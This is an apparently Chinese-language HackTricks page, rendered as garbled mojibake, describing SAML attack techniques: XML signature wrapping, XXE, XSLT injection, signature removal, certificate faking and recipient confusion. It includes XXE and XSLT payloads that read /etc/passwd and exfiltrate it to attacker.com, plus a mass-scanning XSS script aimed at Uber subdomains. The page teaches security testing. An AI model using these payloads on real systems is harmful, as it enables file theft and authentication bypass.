# SAML æ”»å‡»

## SAML æ”»å‡»

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## æ”»å‡»å›¾è§£

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

## å·¥å…·

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor)ï¼šä¸€ä¸ªå¯ä»¥è·å– URL æˆ– URL åˆ—è¡¨å¹¶è¿”å› SAML æ¶ˆè´¹ URL çš„å·¥å…·ã€‚

## XML å¾€è¿”

åœ¨ XML ä¸­ï¼Œç­¾åçš„ XML éƒ¨åˆ†è¢«ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œç„¶åæ‰§è¡Œä¸€äº›ç¼–ç /è§£ç æ“ä½œï¼Œå¹¶æ£€æŸ¥ç­¾åã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œè¿™ç§ç¼–ç /è§£ç ä¸åº”æ”¹å˜æ•°æ®ï¼Œä½†åŸºäºè¯¥åœºæ™¯ï¼Œ**è¢«æ£€æŸ¥çš„æ•°æ®å’ŒåŸå§‹æ•°æ®å¯èƒ½ä¸ä¸€æ ·**ã€‚

ä¾‹å¦‚ï¼Œæ£€æŸ¥ä»¥ä¸‹ä»£ç ï¼š
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
è¿è¡Œè¯¥ç¨‹åºé’ˆå¯¹ REXML 3.2.4 æˆ–æ›´æ—©ç‰ˆæœ¬å°†äº§ç”Ÿä»¥ä¸‹è¾“å‡ºï¼š
```
First child in original doc: Y
First child after round-trip: Z
```
ä»¥ä¸‹æ˜¯REXMLå¦‚ä½•çœ‹åˆ°ä¸Šè¿°ç¨‹åºä¸­çš„åŸå§‹XMLæ–‡æ¡£ï¼š

![](<../../.gitbook/assets/image (561).png>)

è¿™æ˜¯å®ƒç»è¿‡ä¸€è½®è§£æå’Œåºåˆ—åŒ–åçš„æ ·å­ï¼š

![](<../../.gitbook/assets/image (562).png>)

æœ‰å…³æ¼æ´çš„æ›´å¤šä¿¡æ¯ä»¥åŠå¦‚ä½•æ»¥ç”¨å®ƒï¼š

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XMLç­¾ååŒ…è£¹æ”»å‡»

åŒ…å«XMLç­¾åçš„XMLæ–‡æ¡£é€šå¸¸**åˆ†ä¸ºä¸¤ä¸ªç‹¬ç«‹çš„æ­¥éª¤å¤„ç†**ï¼š**ç­¾å** **éªŒè¯**å’Œ**åŠŸèƒ½** **è°ƒç”¨**ï¼ˆä¸šåŠ¡é€»è¾‘ï¼‰ã€‚å¦‚æœä¸¤ä¸ªæ¨¡å—å¯¹æ•°æ®çš„çœ‹æ³•ä¸åŒï¼Œå°±å­˜åœ¨ä¸€ç±»åä¸ºXMLç­¾ååŒ…è£¹æ”»å‡»ï¼ˆXSWï¼‰çš„æ¼æ´ã€‚\
åœ¨è¿™äº›æ”»å‡»ä¸­ï¼Œ**æ”»å‡»è€…**é€šè¿‡**æ³¨å…¥** **ä¼ªé€ **çš„å…ƒç´ æ¥**ä¿®æ”¹** **æ¶ˆæ¯**ç»“æ„ï¼Œè¿™äº›å…ƒç´ **ä¸ä¼šä½¿XMLç­¾åå¤±æ•ˆ**ã€‚è¿™ç§æ”¹å˜çš„ç›®çš„æ˜¯ä»¥è¿™æ ·çš„æ–¹å¼æ”¹å˜æ¶ˆæ¯ï¼Œä½¿å¾—**åº”ç”¨é€»è¾‘å’Œç­¾åéªŒè¯æ¨¡å—ä½¿ç”¨æ¶ˆæ¯çš„ä¸åŒéƒ¨åˆ†**ã€‚å› æ­¤ï¼Œæ¥æ”¶è€…æˆåŠŸéªŒè¯äº†XMLç­¾åï¼Œä½†åº”ç”¨é€»è¾‘å¤„ç†äº†è™šå‡å…ƒç´ ã€‚**æ”»å‡»è€…å› æ­¤ç»•è¿‡äº†XMLç­¾åçš„å®Œæ•´æ€§ä¿æŠ¤**å’Œæºè®¤è¯ï¼Œå¹¶å¯ä»¥æ³¨å…¥ä»»æ„å†…å®¹ã€‚

æ¥è‡ªSAMLè¯·æ±‚ï¼š

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

æ”»å‡»è€…å¯ä»¥**åœ¨ç­¾å**æ‰€åœ¨çš„**æ–°æ ¹å…ƒç´ å¤„æ·»åŠ **ã€‚å› æ­¤ï¼Œå½“éªŒè¯å™¨æ£€æŸ¥ç­¾åçš„å®Œæ•´æ€§æ—¶ï¼Œå®ƒå¯èƒ½ä¼šæ³¨æ„åˆ°å®ƒå·²ç»**æ£€æŸ¥äº†** **Response -> Assertion -> Subject**çš„**å®Œæ•´æ€§**ï¼Œå¹¶ä¸”å¯èƒ½ä¼šä¸çº¢è‰²çš„**é‚ªæ¶æ–°Response -> Assertion -> Subject**è·¯å¾„æ··æ·†ï¼Œå¹¶ä½¿ç”¨å…¶æ•°æ®ã€‚

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

ä¸#1çš„åŒºåˆ«åœ¨äºï¼Œä½¿ç”¨çš„ç­¾åç±»å‹æ˜¯**ç‹¬ç«‹ç­¾å**ï¼Œè€ŒXSW #1ä½¿ç”¨çš„æ˜¯å°è£…ç­¾åã€‚\
æ³¨æ„æ–°çš„é‚ªæ¶ç»“æ„ä¸ä¹‹å‰å°è¯•æ··æ·†ä¸šåŠ¡é€»è¾‘çš„ç»“æ„ç›¸åŒï¼Œè¿™æ˜¯åœ¨å®Œæ•´æ€§æ£€æŸ¥ä¹‹åã€‚

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

åœ¨è¿™æ¬¡æ”»å‡»ä¸­ï¼Œ**åœ¨åŸå§‹æ–­è¨€çš„åŒä¸€çº§åˆ«åˆ›å»ºäº†ä¸€ä¸ªé‚ªæ¶çš„æ–­è¨€**ï¼Œè¯•å›¾æ··æ·†ä¸šåŠ¡é€»è¾‘å¹¶ä½¿ç”¨é‚ªæ¶æ•°æ®ã€‚

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSW #4ä¸#3ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºè¿™ç§æƒ…å†µä¸‹ï¼Œ**åŸå§‹æ–­è¨€æˆä¸ºå¤åˆ¶æ–­è¨€çš„å­å…ƒç´ **ã€‚

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

åœ¨XSW #5ä¸­ï¼Œç­¾åå’ŒåŸå§‹æ–­è¨€ä¸åœ¨ä¸‰ç§æ ‡å‡†é…ç½®ï¼ˆå°è£…/å°è£…/ç‹¬ç«‹ï¼‰ä¹‹ä¸€ä¸­ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤åˆ¶çš„æ–­è¨€å°è£…äº†ç­¾åã€‚

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSW #6å°†å…¶å¤åˆ¶çš„æ–­è¨€æ’å…¥ä¸#4å’Œ#5ç›¸åŒçš„ä½ç½®ã€‚è¿™é‡Œæœ‰è¶£çš„æ˜¯ï¼Œå¤åˆ¶çš„æ–­è¨€å°è£…äº†ç­¾åï¼Œè€Œç­¾ååˆå°è£…äº†åŸå§‹æ–­è¨€ã€‚

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSW #7æ’å…¥äº†ä¸€ä¸ª**Extensions**å…ƒç´ ï¼Œå¹¶å°†å¤åˆ¶çš„**Assertion**ä½œä¸º**å­å…ƒç´ **æ·»åŠ ã€‚Extensionsæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„XMLå…ƒç´ ï¼Œå…·æœ‰**è¾ƒä¸ä¸¥æ ¼çš„æ¨¡å¼å®šä¹‰**ã€‚è¿™ç¯‡[ç™½çš®ä¹¦](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)çš„ä½œè€…ä»¬å¼€å‘äº†è¿™ç§æ–¹æ³•ï¼Œä»¥åº”å¯¹OpenSAMLåº“ã€‚OpenSAMLä½¿ç”¨æ¨¡å¼éªŒè¯æ¥æ­£ç¡®æ¯”è¾ƒåœ¨ç­¾åéªŒè¯æœŸé—´ä½¿ç”¨çš„IDä¸å¤„ç†çš„æ–­è¨€çš„IDã€‚ä½œè€…ä»¬å‘ç°ï¼Œåœ¨å¤åˆ¶çš„æ–­è¨€ä¸åŸå§‹æ–­è¨€å…·æœ‰ç›¸åŒIDçš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¿™äº›æ–­è¨€æ˜¯è¾ƒä¸ä¸¥æ ¼æ¨¡å¼å®šä¹‰å…ƒç´ çš„å­å…ƒç´ ï¼Œä»–ä»¬èƒ½å¤Ÿç»•è¿‡è¿™ç§ç‰¹å®šçš„å¯¹ç­–ã€‚

![](<../../.gitbook/assets/image (544).png>)

### XSW #8

XSW #8ä½¿ç”¨å¦ä¸€ä¸ª**è¾ƒä¸ä¸¥æ ¼çš„XMLå…ƒç´ **æ¥æ‰§è¡ŒXSW #7ä¸­ä½¿ç”¨çš„æ”»å‡»æ¨¡å¼çš„å˜ä½“ã€‚è¿™æ¬¡ï¼ŒåŸå§‹æ–­è¨€æ˜¯è¾ƒä¸ä¸¥æ ¼å…ƒç´ çš„å­å…ƒç´ ï¼Œè€Œä¸æ˜¯å¤åˆ¶çš„æ–­è¨€ã€‚

![](<../../.gitbook/assets/image (545).png>)

### å·¥å…·

æ‚¨å¯ä»¥ä½¿ç”¨Burpæ‰©å±•[**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)æ¥è§£æè¯·æ±‚ï¼Œåº”ç”¨æ‚¨é€‰æ‹©çš„ä»»ä½•XSWæ”»å‡»ï¼Œå¹¶å‘èµ·å®ƒã€‚

![](<../../.gitbook/assets/image (546).png>)

### åŸå§‹è®ºæ–‡

æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»åŸå§‹è®ºæ–‡[https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)

## XXE

å¦‚æœæ‚¨ä¸çŸ¥é“XXEæ”»å‡»æ˜¯å“ªç§ç±»å‹ï¼Œè¯·é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

ç”±äºSAMLå“åº”æ˜¯è¢«å‹ç¼©å’Œbase64ç¼–ç çš„**XMLæ–‡æ¡£**ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ“çºµä½œä¸ºSAMLå“åº”å‘é€çš„XMLæ–‡æ¡£æ¥æµ‹è¯•**XXE**ã€‚ä¾‹å¦‚ï¼š
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
### å·¥å…·

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ Burp æ‰©å±• [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) ä» SAML è¯·æ±‚ç”Ÿæˆ POCï¼Œä»¥æµ‹è¯•å¯èƒ½çš„ XXE æ¼æ´ã€‚

ä¹Ÿè¯·æŸ¥çœ‹æ­¤è®²åº§ï¼š[https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## é€šè¿‡ SAML çš„ XSLT

æœ‰å…³ XSLT çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ï¼ˆXSLTï¼‰æ˜¯ä¸€ç§å›¾çµå®Œå¤‡è¯­è¨€ï¼Œç”¨äºå°† XML æ–‡æ¡£è½¬æ¢ä¸ºå…¶ä»–æ–‡æ¡£ç±»å‹ï¼Œå¦‚ HTMLã€JSON æˆ– PDFã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸€ä¸ªé‡è¦æ–¹é¢æ˜¯ï¼Œ**æ”»å‡»ä¸éœ€è¦æœ‰æ•ˆç­¾åå°±èƒ½æˆåŠŸ**ã€‚åŸå› æ˜¯ **XSLT è½¬æ¢å‘ç”Ÿåœ¨æ•°å­—ç­¾åè¢«å¤„ç†ä»¥è¿›è¡ŒéªŒè¯ä¹‹å‰**ã€‚åŸºæœ¬ä¸Šï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç­¾åçš„ SAML å“åº”æ¥æ‰§è¡Œæ”»å‡»ï¼Œä½†ç­¾åå¯ä»¥æ˜¯è‡ªç­¾åçš„æˆ–æ— æ•ˆçš„ã€‚

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª **POC** æ¥æ£€æŸ¥è¿™ç§ç±»å‹çš„æ¼æ´ï¼Œåœ¨æœ¬èŠ‚å¼€å¤´æåˆ°çš„ hacktricks é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰æ•ˆè½½è·ã€‚
```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### å·¥å…·

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ Burp æ‰©å±• [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) ä» SAML è¯·æ±‚ç”Ÿæˆ POCï¼Œä»¥æµ‹è¯•å¯èƒ½çš„ XSLT æ¼æ´ã€‚

ä¹Ÿè¯·æŸ¥çœ‹æ­¤è®²åº§ï¼š[https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML ç­¾åæ’é™¤ <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

ç­¾åæ’é™¤ç”¨äºæµ‹è¯•å½“**æ²¡æœ‰ç­¾åå…ƒç´ **æ—¶ SAML å®ç°çš„è¡Œä¸ºã€‚å½“ç­¾åå…ƒç´ **ç¼ºå¤±**æ—¶ï¼Œ**ç­¾åéªŒè¯æ­¥éª¤å¯èƒ½ä¼šå®Œå…¨è¢«è·³è¿‡**ã€‚å¦‚æœç­¾åæ²¡æœ‰è¢«éªŒè¯ï¼Œé‚£ä¹ˆé€šå¸¸ä¼šè¢«ç­¾åçš„å†…å®¹å¯èƒ½ä¼šè¢«æ”»å‡»è€…ç¯¡æ”¹ã€‚

![](<../../.gitbook/assets/image (547).png>)

### å·¥å…· <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

ç­¾åæ’é™¤ä»æ‹¦æˆª SAML å“åº”å¼€å§‹ï¼Œç„¶åç‚¹å‡» `Remove Signatures`ã€‚è¿™æ ·åšä¼šç§»é™¤**æ‰€æœ‰**ç­¾åå…ƒç´ ã€‚

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

ç§»é™¤ç­¾ååï¼Œå…è®¸è¯·æ±‚ç»§ç»­åˆ°è¾¾ç›®æ ‡ã€‚å¦‚æœæœåŠ¡

## è¯ä¹¦ä¼ªé€  <a href="#certificate-faking" id="certificate-faking"></a>

è¯ä¹¦ä¼ªé€ æ˜¯æµ‹è¯•æœåŠ¡æä¾›å•†**æ˜¯å¦éªŒè¯äº†å¯ä¿¡èº«ä»½æä¾›å•†ç­¾åäº† SAML æ¶ˆæ¯**çš„è¿‡ç¨‹ã€‚æœåŠ¡æä¾›å•†å’Œèº«ä»½æä¾›å•†ä¹‹é—´çš„ä¿¡ä»»å…³ç³»å·²å»ºç«‹ï¼Œå¹¶ä¸”**åº”è¯¥åœ¨æ¯æ¬¡æ¥æ”¶ SAML æ¶ˆæ¯æ—¶è¿›è¡ŒéªŒè¯**ã€‚è¿™å½’ç»“ä¸ºä½¿ç”¨**è‡ªç­¾å**è¯ä¹¦æ¥ç­¾ç½² SAML å“åº”æˆ–æ–­è¨€ã€‚

### å·¥å…· <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

å°†ä½¿ç”¨ Burp æ‰©å±• [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ã€‚\
è¦ä¼ªé€ è¯ä¹¦ï¼Œé¦–å…ˆæ‹¦æˆª SAML å“åº”ã€‚\
å¦‚æœå“åº”ä¸­åŒ…å«ç­¾åï¼Œè¯·ä½¿ç”¨ `Send Certificate to SAML Raider Certs` æŒ‰é’®ã€‚

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

å‘é€è¯ä¹¦åï¼Œæˆ‘ä»¬åº”è¯¥åœ¨ SAML Raider è¯ä¹¦æ ‡ç­¾ä¸­çœ‹åˆ°ä¸€ä¸ªå¯¼å…¥çš„è¯ä¹¦ã€‚åœ¨é‚£é‡Œï¼Œæˆ‘ä»¬çªå‡ºæ˜¾ç¤ºå¯¼å…¥çš„è¯ä¹¦å¹¶æŒ‰ä¸‹ `Save and Self-Sign` æŒ‰é’®ã€‚

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

è¿™æ ·åšä¼šç”ŸæˆåŸå§‹è¯ä¹¦çš„è‡ªç­¾åå…‹éš†ã€‚ç°åœ¨æ˜¯æ—¶å€™å›åˆ°ä»ç„¶åœ¨ burp çš„ Proxy ä¸­ä¿ç•™çš„æ‹¦æˆªè¯·æ±‚ã€‚é¦–å…ˆï¼Œä» XML ç­¾åä¸‹æ‹‰èœå•ä¸­é€‰æ‹©æ–°çš„è‡ªç­¾åè¯ä¹¦ã€‚ç„¶åä½¿ç”¨ `Remove Signatures` æŒ‰é’®ç§»é™¤ä»»ä½•ç°æœ‰çš„ç­¾åã€‚æœ€åï¼Œä½¿ç”¨ **`(Re-)Sign Message`** æˆ– `(`**`Re-)Sign Assertion`** æŒ‰é’®ï¼ˆ**æ ¹æ®æ‚¨çš„å…·ä½“æƒ…å†µ**é€‰æ‹©**æ›´**é€‚å½“çš„ä¸€ä¸ªï¼‰ã€‚

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

ä½¿ç”¨è‡ªç­¾åè¯ä¹¦ç­¾åæ¶ˆæ¯åï¼Œå‘é€å®ƒã€‚å¦‚æœæˆ‘ä»¬è®¤è¯æˆåŠŸï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬å¯ä»¥ç­¾ç½²æˆ‘ä»¬çš„ SAML æ¶ˆæ¯ã€‚èƒ½å¤Ÿç­¾ç½²æˆ‘ä»¬çš„ SAML æ¶ˆæ¯æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ›´æ”¹æ–­è¨€ä¸­çš„å€¼ï¼Œå®ƒä»¬å°†è¢«æœåŠ¡æä¾›å•†æ¥å—ã€‚

## ä»¤ç‰Œæ¥æ”¶è€…æ··æ·† / æœåŠ¡æä¾›å•†ç›®æ ‡æ··æ·† <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

ä»¤ç‰Œæ¥æ”¶è€…æ··æ·† / æœåŠ¡æä¾›å•†ç›®æ ‡æ··æ·†**æµ‹è¯•æœåŠ¡æä¾›å•†æ˜¯å¦éªŒè¯äº†æ¥æ”¶è€…**ã€‚è¿™æ„å‘³ç€ï¼Œ**å¦‚æœå“åº”æ˜¯ä¸ºä¸åŒçš„æœåŠ¡æä¾›å•†å‡†å¤‡çš„**ï¼Œ**å½“å‰**æœåŠ¡æä¾›å•†åº”è¯¥æ³¨æ„åˆ°å¹¶**æ‹’ç»è®¤è¯**ã€‚\
**æ¥æ”¶è€…**å­—æ®µæ˜¯ SAML å“åº”ä¸­ Subject å…ƒç´ çš„å­å…ƒç´  **SubjectConfirmationData** å…ƒç´ çš„å±æ€§ã€‚

> SubjectConfirmationData å…ƒç´ æŒ‡å®šäº†å…è®¸ç¡®è®¤ä¸»é¢˜æˆ–é™åˆ¶ä¸»é¢˜ç¡®è®¤è¡Œä¸ºå‘ç”Ÿçš„æƒ…å†µçš„é¢å¤–æ•°æ®ã€‚å½“ä¾èµ–æ–¹å¯»æ±‚éªŒè¯æå‡ºæ–­è¨€çš„å®ä½“ï¼ˆå³ï¼Œä½œè¯å®ä½“ï¼‰ä¸æ–­è¨€å£°æ˜çš„ä¸»é¢˜ä¹‹é—´çš„å…³ç³»æ—¶ï¼Œå°±ä¼šå‘ç”Ÿä¸»é¢˜ç¡®è®¤ã€‚

**SubjectConfirmationData å…ƒç´ ä¸Šçš„æ¥æ”¶è€…å±æ€§æ˜¯ä¸€ä¸ª URLï¼Œå®ƒæŒ‡å®šäº†å¿…é¡»ä¼ é€æ–­è¨€çš„ä½ç½®**ã€‚å¦‚æœæ¥æ”¶è€…æ˜¯ä¸æ¥æ”¶å®ƒçš„æœåŠ¡æä¾›å•†ä¸åŒçš„æœåŠ¡æä¾›å•†ï¼Œåˆ™ä¸åº”æ¥å—æ–­è¨€ã€‚

### å¦‚ä½•æ“ä½œ <a href="#token-recipient-confusion-how-to" id="token-recipient-confusion-how-to"></a>

SAML ä»¤ç‰Œæ¥æ”¶è€…æ··æ·†ï¼ˆSAML-TRCï¼‰åœ¨æˆ‘ä»¬å°è¯•åˆ©ç”¨ä¹‹å‰æœ‰ä¸€äº›å…ˆå†³æ¡ä»¶ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬**éœ€è¦**åœ¨æœåŠ¡æä¾›å•†ä¸Šæœ‰ä¸€ä¸ª**åˆæ³•è´¦æˆ·**ã€‚å…¶æ¬¡ï¼Œ**SP-Target å¿…é¡»æ¥å—ç”±æœåŠ¡ SP-Legit çš„åŒä¸€èº«ä»½æä¾›å•†å‘å‡ºçš„ä»¤ç‰Œ**ã€‚

å¦‚æœæ¡ä»¶æˆç«‹ï¼Œæ”»å‡»ç›¸å¯¹ç®€å•ã€‚æˆ‘ä»¬é€šè¿‡å…±äº«çš„èº«ä»½æä¾›å•†**è®¤è¯**åˆ°**SP-Legit**ã€‚ç„¶åï¼Œæˆ‘ä»¬**æ‹¦æˆªä» IdP åˆ° SP-Legit çš„ SAML å“åº”**ã€‚ä¸€æ—¦æ‹¦æˆªï¼Œæˆ‘ä»¬å°†**åŸæœ¬å‘ç»™ SP-Legit çš„ SAML å“åº”å‘é€ç»™ SP-Target**ã€‚å¦‚æœ**SP-Target æ¥å—äº†æ–­è¨€**ï¼›æˆ‘ä»¬ä¼šå‘ç°è‡ªå·±ä»¥æˆ‘ä»¬åœ¨ SP-Legit çš„ç›¸åŒè´¦æˆ·åç™»å½•ï¼Œå¹¶è·å¾— SP-Target å¯¹åº”èµ„æºçš„è®¿é—®æƒé™ã€‚

## æ³¨é”€åŠŸèƒ½ä¸­çš„ XSS

(è®¿é—®[åŸå§‹ç ”ç©¶è¿™é‡Œ](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/))

åœ¨æ‰§è¡Œç›®å½•æš´åŠ›ç ´è§£åï¼Œæˆ‘å‘ç°äº†ä»¥ä¸‹é¡µé¢ï¼š
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
å®ƒæ˜¯ä¸€ä¸ªç™»å‡ºé¡µé¢ï¼Œæˆ‘æ‰“å¼€äº†ä¸Šé¢çš„é“¾æ¥ï¼Œå®ƒç¡®å®å°†æˆ‘é‡å®šå‘åˆ°äº†ä»¥ä¸‹é¡µé¢
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
åŸºç¡€å‚æ•°æ­£åœ¨ä½¿ç”¨ä¸€ä¸ªURLï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥ç”¨è€å¼ç»å…¸çš„ `javascript:alert(123);` æ›¿æ¢å®ƒï¼Œä»¥è§¦å‘XSSã€‚

### å¤§è§„æ¨¡åˆ©ç”¨

ä½¿ç”¨[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor)ï¼Œå®ƒå¯ä»¥æ¥å—ä¸€ä¸ªURLåˆ—è¡¨ï¼Œç„¶åè¿”å›å›è°ƒï¼ˆSAMLæ¶ˆè´¹ï¼‰URLï¼Œæˆ‘å†³å®šç”¨`uberinternal.com`çš„æ‰€æœ‰å­åŸŸæ¥å–‚å…»è¿™ä¸ªå·¥å…·ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å…¶ä»–åŸŸåä½¿ç”¨ç›¸åŒçš„åº“ï¼Œç»“æœç¡®å®å¦‚æ­¤ã€‚

æ¥ä¸‹æ¥æˆ‘æ‰€åšçš„æ˜¯åˆ›å»ºä¸€ä¸ªè„šæœ¬ï¼Œè°ƒç”¨æ˜“å—æ”»å‡»çš„é¡µé¢ `oidauth/prompt` å¹¶å°è¯•XSSï¼Œå¦‚æœæˆ‘çš„è¾“å…¥è¢«åæ˜ ï¼Œå®ƒä¼šç»™æˆ‘ä¸€ä¸ªæ¼æ´ä¿¡æ¯ã€‚
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## å‚è€ƒèµ„æ–™

